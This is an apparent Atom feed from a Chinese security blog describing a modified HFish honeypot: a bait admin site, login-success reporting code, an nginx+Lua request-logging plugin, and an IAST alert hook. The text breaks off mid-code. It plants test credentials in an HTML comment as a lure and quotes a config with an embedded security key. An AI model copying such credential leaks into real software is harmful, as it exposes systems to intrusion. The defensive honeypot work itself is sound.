<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="http://www.pa55w0rd.online/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.online/"/>
  <updated>2021-08-19T07:04:16.874Z</updated>
  <id>http://www.pa55w0rd.online/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>魔改开源版本HFish - 高交互Web蜜罐</title>
    <link href="http://www.pa55w0rd.online/hfish-web/"/>
    <id>http://www.pa55w0rd.online/hfish-web/</id>
    <published>2021-08-19T01:57:14.000Z</published>
    <updated>2021-08-19T07:04:16.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里魔改的HFish指的是三斤大佬维护的版本，现在的版本为闭源免费使用。</p><p>考虑到蜜罐的使用场景，主要为伪装成开放端口、服务和对外的web服务</p><p>经过测试，这个版本的HFish，无法捕获全端口位置扫描，当然可以通过自定义配置端口监听，可实现端口TCP三次握手后的捕获，syn扫描无法捕获</p><p>部署在内网，在我看来，不需要太多的交互，低交互蜜罐就够用了，及时发现内网中的异常行为，我在内网部署了一套OpenCanray低交互蜜罐，这里推荐美团大佬 P师傅 <code>p1r06u3</code> 的项目<code>https://github.com/p1r06u3/opencanary_web</code>，提供了web端管理后台</p><p>这篇文章写一下我对web蜜罐的一些想法</p><span id="more"></span><h2 id="诱饵"><a href="#诱饵" class="headerlink" title="诱饵"></a>诱饵</h2><p>web蜜罐，需要一个交互式的web网站，我用了fastadmin框架模拟了一个web后台，申请了一个比较有诱惑力的域名，如admin1、admins、sysadmin、sadmin、adminer、devadmin、testadmin、loginadmin、wpadmin等等，登陆的前端代码注释里面留一下测试账号等等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--username:test password:test --&gt;</span></span><br></pre></td></tr></table></figure><p>这里和HFish 自带的web蜜罐报警不一样，因为是高交互，有后台，这里对暴力破解不会产生报警，只有<code>登陆成功才会触发报警</code></p><p>这样有一个好处就是，对外仅保留web蜜罐，蜜罐上报接口和key不会暴漏</p><h2 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h2><p>HFish 对于web的上报接口主要有3个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web_url = /api/v1/post/report                   <span class="comment"># WEB蜜罐上报 API</span></span><br><span class="line">deep_url = /api/v1/post/deep_report             <span class="comment"># 暗网蜜罐上报 API</span></span><br><span class="line">plug_url = /api/v1/post/plug_report             <span class="comment"># 插件蜜罐上报 API</span></span><br></pre></td></tr></table></figure><p>做一下区分：</p><p>其中plug接口用于做<code>攻击行为感知</code></p><p>deep接口用于接收<code>登陆成功</code>或<code>攻击成功</code>的告警</p><p>web接口用于接收<code>文件操作</code>、<code>命令监控</code>、<code>溯源</code>等信息</p><p>这里修改一下deep接口的代码，ip通过表单提交，因为登陆成功和攻击成功，都是在后台上报，无法在客户端获取</p><p><code>/view/api/view.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReportDeepWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    ip := c.PostForm(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="登陆成功告警"><a href="#登陆成功告警" class="headerlink" title="登陆成功告警"></a>登陆成功告警</h2><p>找到后台登陆逻辑<br><code>/fastadmin/application/admin/controller/Index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;auth-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$keeplogin</span> ? <span class="number">86400</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$ip</span> = <span class="keyword">$this</span>-&gt;request-&gt;ip();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable">$url1</span> = <span class="string">&quot;http://127.0.0.1:8080/api/v1/post/deep_report&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;后台登录成功告警&quot;</span>;</span><br><span class="line">        <span class="variable">$jsonStr</span> = <span class="string">&quot;<span class="subst">$name</span>&amp;info=<span class="subst">$username</span>%26%26<span class="subst">$password</span>&amp;sec_key=xxx&amp;ip=<span class="subst">$ip</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;request_by_curl(<span class="variable">$url1</span>, <span class="variable">$jsonStr</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击行为感知"><a href="#攻击行为感知" class="headerlink" title="攻击行为感知"></a>攻击行为感知</h2><p>这里参考：HFish 插件 (任意站点,皆可蜜罐)，通过nginx + lua，将请求头和请求体发送到蜜罐，就是存放完整的访问日志，在检测到攻击告警时，通过分析日志来判断攻击者做了什么操作</p><p>这里省事，直接安装OpenResty </p><p>这里从docker镜像里，把lua脚本扒出来</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span> <span class="string">&quot;cjson&quot;</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;resty.http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">http_post</span><span class="params">(url, body)</span></span></span><br><span class="line">    <span class="keyword">local</span> httpc = http.new()</span><br><span class="line">    httpc:set_timeout(<span class="number">30000</span>)</span><br><span class="line">    <span class="keyword">local</span> res, err_ = httpc:request_uri(url, &#123;</span><br><span class="line">        method = <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        body = body,</span><br><span class="line">        headers = &#123;[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    httpc:set_keepalive(<span class="number">5000</span>, <span class="number">100</span>)</span><br><span class="line">    httpc:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> data = &#123;</span><br><span class="line">        host = ngx.var.host,</span><br><span class="line">        uri = ngx.var.uri,</span><br><span class="line">        method = ngx.var.request_method,</span><br><span class="line">        remote_addr = ngx.var.http_x_forwarded_for,</span><br><span class="line">        time_local = ngx.var.time_local,</span><br><span class="line">        http_user_agent = ngx.var.http_user_agent,</span><br><span class="line">        request_time = ngx.var.request_time</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> == ngx.var.request_method <span class="keyword">then</span></span><br><span class="line">        data[<span class="string">&quot;args&quot;</span>] = ngx.req.get_uri_args()</span><br><span class="line">    <span class="keyword">elseif</span> <span class="string">&quot;POST&quot;</span> == ngx.var.request_method <span class="keyword">then</span></span><br><span class="line">        ngx.req.read_body()</span><br><span class="line">        data[<span class="string">&quot;args&quot;</span>] = ngx.req.get_post_args()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">string.split</span><span class="params">(input, delimiter)</span></span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">tostring</span>(<span class="built_in">input</span>)</span><br><span class="line">    delimiter = <span class="built_in">tostring</span>(delimiter)</span><br><span class="line">        <span class="keyword">if</span> (delimiter==<span class="string">&#x27;&#x27;</span>) <span class="keyword">then</span> <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> pos,arr = <span class="number">0</span>, &#123;&#125;</span><br><span class="line">    <span class="comment">-- for each divider found</span></span><br><span class="line">    <span class="keyword">for</span> st,sp <span class="keyword">in</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span> <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">find</span>(<span class="built_in">input</span>, delimiter, pos, <span class="literal">true</span>) <span class="keyword">end</span> <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(arr, <span class="built_in">string</span>.<span class="built_in">sub</span>(<span class="built_in">input</span>, pos, st - <span class="number">1</span>))</span><br><span class="line">        pos = sp + <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">table</span>.<span class="built_in">insert</span>(arr, <span class="built_in">string</span>.<span class="built_in">sub</span>(<span class="built_in">input</span>, pos))</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> headers=ngx.req.get_headers()</span><br><span class="line">    <span class="keyword">local</span> clientIP=headers[<span class="string">&quot;X_FORWARDED_FOR&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> clientIP == <span class="literal">nil</span> <span class="keyword">or</span> <span class="built_in">string</span>.<span class="built_in">len</span>(clientIP) == <span class="number">0</span> <span class="keyword">or</span> clientIP == <span class="string">&quot;unknown&quot;</span> <span class="keyword">then</span></span><br><span class="line">        clientIP = ngx.var.remote_addr    </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> clientIP ~= <span class="literal">nil</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">len</span>(clientIP) &gt;<span class="number">15</span>  <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> pos  = <span class="built_in">string</span>.split(clientIP,<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        clientIP = pos[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> result = &#123;</span><br><span class="line">        name = ngx.var.hfish_name,</span><br><span class="line">        info = data,</span><br><span class="line">        sec_key = ngx.var.hfish_sec_key,</span><br><span class="line">        ip = clientIP</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cjson.encode(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">http_post(ngx.var.hfish_api, get_data())</span><br></pre></td></tr></table></figure><p>nginx配置文件添加</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set $hfish_name <span class="string">&#x27;攻击行为感知&#x27;</span>;  # 插件名称</span><br><span class="line">set $hfish_sec_key <span class="string">&#x27;xxx&#x27;</span>;  # 接口安全密钥</span><br><span class="line">set $hfish_api <span class="string">&#x27;http://127.0.0.1:8989/api/v1/post/plug_report&#x27;</span>;    # 插件接口</span><br><span class="line">    # HFish 插件核心模块</span><br><span class="line">access_by_lua_file <span class="string">&#x27;/usr/local/src/honeypot/hfish.lua&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>攻击行为感知</p><p><img src="https://pic.rmb.bdstatic.com/bjh/59178dfba9e21905b3094555c2f8bfac.png" alt="image.png"></p><p>后台登陆成功，这里可以配合企业微信/钉钉/飞书自动告警及时响应</p><p><img src="https://pic.rmb.bdstatic.com/bjh/7daff985ce0b3d6fd3956a510700f914.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/2a4d8e0b2f16be5334863f827d24ae76.png" alt="image.png"></p><h2 id="没时间研究的"><a href="#没时间研究的" class="headerlink" title="没时间研究的"></a>没时间研究的</h2><p>通过nginx + lua实现更多的功能</p><p><code>参考：蜜罐背后的影子系统探秘 https://cloud.tencent.com/developer/article/1045869</code><br><code>参考：Juggler - 一个也许能骗到黑客的系统 https://github.com/C4o/Juggler</code></p><p>一般场景下我们会在内部部署蜜罐系统，当外部有渗透时，碰到蜜罐就会报警，蜜罐会去检索攻击源的位置，确定别攻击机器的IP端口，取得payload数据，配合IDS我们可以捕获事件的过程，然后采取对应防御措施。还有一种办法，我们可以在蜜罐被触碰的时候，把流量引入到一台具体的机器上，伪装成一个正常的服务，像侦查机一样，收集攻击服务。我们以WEB服务为例，有一个接近真实的HTTP服务器，主动或是被动的配合蜜罐收集更多的数据，当蜜罐发现威胁IP时，运用动态迁移技术，将威胁服务引到到一个提新预备好的WEB服务，记录攻击行业，还原威胁事件。</p><p>负载均衡和灰度测试的WEB服务就是根据特定的用户和被访问机器的负载情况，决定将用户的请求切入到那台服务上。我们也用这种技术， 对有可以行为的攻击请求，进行环境切换。</p><p>我们用Openresty的上流反向代理来实现这种模式。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这里魔改的HFish指的是三斤大佬维护的版本，现在的版本为闭源免费使用。&lt;/p&gt;
&lt;p&gt;考虑到蜜罐的使用场景，主要为伪装成开放端口、服务和对外的web服务&lt;/p&gt;
&lt;p&gt;经过测试，这个版本的HFish，无法捕获全端口位置扫描，当然可以通过自定义配置端口监听，可实现端口TCP三次握手后的捕获，syn扫描无法捕获&lt;/p&gt;
&lt;p&gt;部署在内网，在我看来，不需要太多的交互，低交互蜜罐就够用了，及时发现内网中的异常行为，我在内网部署了一套OpenCanray低交互蜜罐，这里推荐美团大佬 P师傅 &lt;code&gt;p1r06u3&lt;/code&gt; 的项目&lt;code&gt;https://github.com/p1r06u3/opencanary_web&lt;/code&gt;，提供了web端管理后台&lt;/p&gt;
&lt;p&gt;这篇文章写一下我对web蜜罐的一些想法&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>魔改开源版本HFish - 溯源（JSONP漏洞利用）</title>
    <link href="http://www.pa55w0rd.online/hfish-jsonp/"/>
    <id>http://www.pa55w0rd.online/hfish-jsonp/</id>
    <published>2021-08-19T01:57:06.000Z</published>
    <updated>2021-08-19T05:37:27.983Z</updated>
    
    <content type="html"><![CDATA[<p>公众号链接：<a href="https://mp.weixin.qq.com/s/zkdPcWTFtzrachpqbjLoow">魔改HFish - 溯源（JSONP漏洞利用）</a><br>博客链接：<a href="https://www.pa55w0rd.online/jsonp/">JSONP劫持</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;公众号链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/zkdPcWTFtzrachpqbjLoow&quot;&gt;魔改HFish - 溯源（JSONP漏洞利用）&lt;/a&gt;&lt;br&gt;博客链接：&lt;a href=&quot;https://www.pa55w0rd.onlin</summary>
      
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>HFish插件 - 任意站点，皆可蜜罐</title>
    <link href="http://www.pa55w0rd.online/hfish-plug/"/>
    <id>http://www.pa55w0rd.online/hfish-plug/</id>
    <published>2021-08-19T01:57:00.000Z</published>
    <updated>2021-08-19T06:58:18.066Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转发：<a href="https://www.v2ex.com/t/599168">https://www.v2ex.com/t/599168</a></p></blockquote><h2 id="HFish-插件是什么？"><a href="#HFish-插件是什么？" class="headerlink" title="HFish 插件是什么？"></a>HFish 插件是什么？</h2><blockquote><p>通过插件可以 100% 的让任意 WEB 服务成为蜜罐</p></blockquote><p><code>HFish</code> 插件是基于 <code>Nginx + Lua</code> 进行实现的 <code>任意站点，皆可蜜罐</code> 的牛逼思路！</p><p>目前已经打包好了 <code>Docker</code> 镜像，通过 <code>hfishs/hub</code> 可以快速让任意站点当成自己蜜罐。</p><span id="more"></span><h2 id="有哪些使用场景？"><a href="#有哪些使用场景？" class="headerlink" title="有哪些使用场景？"></a>有哪些使用场景？</h2><blockquote><p>只提供三种使用场景，更多场景自行思考</p></blockquote><p>搭建<code>开源 CMS </code>程序，获取最新的 <code>0Day</code></p><p>快速集成企业内部 WEB 服务，搭建 <code>密网环境</code></p><p>通过一些技术手段，实现主动攻击型 <code>蜜罐</code></p><h2 id="有哪些部署方案？"><a href="#有哪些部署方案？" class="headerlink" title="有哪些部署方案？"></a>有哪些部署方案？</h2><blockquote><p>只提供三种部署方案，更多部署根据实际情况进行搭建</p></blockquote><p>直接 <code>反代域名</code>，让互联网站点成为蜜罐</p><p>通过 <code>域名解析</code> 物理机 WEB 服务，成为蜜罐 (不安全)</p><p>搭建 <code>Docker 集群</code>， 通过 hfishs/hub 插件成为蜜罐 (安全)</p><p>Docker 镜像地址：<a href="https://hub.docker.com/r/hfishs/hub">https://hub.docker.com/r/hfishs/hub</a></p><h2 id="nginx-配置镜像站"><a href="#nginx-配置镜像站" class="headerlink" title="nginx 配置镜像站"></a>nginx 配置镜像站</h2><blockquote><p>因为现在网站大多都做了防盗链机制，这种方式不采用了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 8083;   # WEB 服务的端口，此次拿 8083 端口演示</span><br><span class="line">    server_name localhost;   # 填写自己的域名，测试可以使用 localhost</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass https://hfish.io/;  # 反代的站点，此处使用 HFish 官网 做演示</span><br><span class="line">                </span><br><span class="line">        sub_filter https://hfish.io/ http://localhost:8083/;  # 因为是反代域名 需要替换</span><br><span class="line">        sub_filter_once off;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host hfish.io;  # 反代站点 Host</span><br><span class="line">        proxy_set_header Referer https://hfish.io;  # 反代站点地址</span><br><span class="line"></span><br><span class="line">        proxy_cache_key &quot;$scheme://$host$request_uri&quot;;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        # 以下内容 不可删除</span><br><span class="line">        set $hfish_name &#x27;HFish 蜜罐&#x27;;  # 插件名称 </span><br><span class="line">        set $hfish_sec_key &#x27;9cbf8a4dcb8e30682b927f352d6559a0&#x27;;  # 接口安全密钥</span><br><span class="line">        set $hfish_api &#x27;http://192.168.65.2:8989/api/v1/post/plug_report&#x27;;    # 插件接口</span><br><span class="line">                </span><br><span class="line">        # HFish 插件核心模块</span><br><span class="line">        access_by_lua_file &#x27;/home/lua/hfish.lua&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;转发：&lt;a href=&quot;https://www.v2ex.com/t/599168&quot;&gt;https://www.v2ex.com/t/599168&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;HFish-插件是什么？&quot;&gt;&lt;a href=&quot;#HFish-插件是什么？&quot; class=&quot;headerlink&quot; title=&quot;HFish 插件是什么？&quot;&gt;&lt;/a&gt;HFish 插件是什么？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;通过插件可以 100% 的让任意 WEB 服务成为蜜罐&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;HFish&lt;/code&gt; 插件是基于 &lt;code&gt;Nginx + Lua&lt;/code&gt; 进行实现的 &lt;code&gt;任意站点，皆可蜜罐&lt;/code&gt; 的牛逼思路！&lt;/p&gt;
&lt;p&gt;目前已经打包好了 &lt;code&gt;Docker&lt;/code&gt; 镜像，通过 &lt;code&gt;hfishs/hub&lt;/code&gt; 可以快速让任意站点当成自己蜜罐。&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST 钉钉自动化告警闭环</title>
    <link href="http://www.pa55w0rd.online/iast-dingding/"/>
    <id>http://www.pa55w0rd.online/iast-dingding/</id>
    <published>2021-08-12T05:42:06.000Z</published>
    <updated>2021-08-12T06:51:01.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>洞态IAST上线有一段时间了，基于被动式IAST技术，高检出率和低误报率等特点，很好的集成到devops流程中，增加我们的效率，然而每次发现漏洞后没有及时查看导致漏洞处理上的滞后，这里通过钉钉群里机器人做自动化告警，使IAST使用上闭环起来</p><span id="more"></span><h2 id="钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）"><a href="#钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）" class="headerlink" title="钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）"></a>钉钉群聊机器人（这里可以使用飞书、企业微信等都可以的）</h2><p>群里机器人文档：<a href="https://developers.dingtalk.com/document/robots/custom-robot-access">https://developers.dingtalk.com/document/robots/custom-robot-access</a></p><p>介绍了如何接入、消息类型、数据格式和错误代码排查等使用上的问题</p><p>这里获取了钉钉机器人的<strong>webhook</strong>，复制下来，在安全设置中，添加<strong>关键词</strong>用来接收告警</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webhook = https:<span class="regexp">//</span>oapi.dingtalk.com<span class="regexp">/robot/</span>send?access_token=xxx</span><br><span class="line">关键词：IAST</span><br></pre></td></tr></table></figure><h2 id="洞态IAST接入钉钉机器人"><a href="#洞态IAST接入钉钉机器人" class="headerlink" title="洞态IAST接入钉钉机器人"></a>洞态IAST接入钉钉机器人</h2><p>通过洞态服务架构了解，DongTai-engine 服务是用来漏洞检测的，根据调用方法数据和污点跟踪算法分析HTTP/HTTPS/RPC请求中是否存在漏洞，通过代码发现火线团队已经在代码中预留了发送漏洞告警的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DongTai-engine<span class="regexp">/signals/</span>handlers/vul_handler.py  的 send_vul_notify()</span><br></pre></td></tr></table></figure><p>我们接入钉钉告警机器人就放到这个方法里</p><p>这里可以看到，传入了一个vul参数，由<code>handler_vul()</code>调用 <code>send_vul_notify()</code>， 看上面的注释，vul参数的数据格式</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http_url:</span> 漏洞所在url</span><br><span class="line"><span class="symbol">http_uri:</span> 漏洞所在uri</span><br><span class="line"><span class="symbol">context_path:</span> HTTP请求上下文</span><br><span class="line"><span class="symbol">http_method:</span> HTTP请求方法</span><br><span class="line"><span class="symbol">http_scheme:</span> HTTP请求协议</span><br><span class="line"><span class="symbol">http_protocol:</span> HTTP请求协议</span><br><span class="line"><span class="symbol">req_header:</span> HTTP请求头</span><br><span class="line"><span class="symbol">req_data:</span> HTTP请求体</span><br><span class="line"><span class="symbol">res_header:</span> HTTP响应头</span><br><span class="line"><span class="symbol">res_body:</span> HTTP响应体</span><br><span class="line"><span class="symbol">vul_type:</span> 漏洞类型</span><br><span class="line"><span class="symbol">vul_level:</span> 漏洞等级</span><br><span class="line"><span class="symbol">full_stack:</span> 漏洞对应的调用链数据</span><br><span class="line"><span class="symbol">top_stack:</span> 漏洞对应污点调用链的链首</span><br><span class="line"><span class="symbol">bottom_stack:</span> 漏洞对应污点调用链的链尾</span><br><span class="line"><span class="symbol">taint_value:</span> 污点值</span><br><span class="line"><span class="symbol">taint_position:</span> 污点所在位置</span><br><span class="line"><span class="symbol">agent_token:</span> Agent的token</span><br><span class="line"><span class="symbol">project:</span> 所在的项目</span><br><span class="line"><span class="symbol">counts:</span> 漏洞出现次数</span><br><span class="line"><span class="symbol">client_ip:</span> 客户端IP</span><br><span class="line"><span class="symbol">username:</span> 漏洞所在用户的用户名</span><br></pre></td></tr></table></figure><p><strong>因为我们只是自己用，就不做交互处理，直接写死到代码中</strong></p><p>钉钉机器人支持@人，这里可以根据不同业务线设置不同告警接收人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 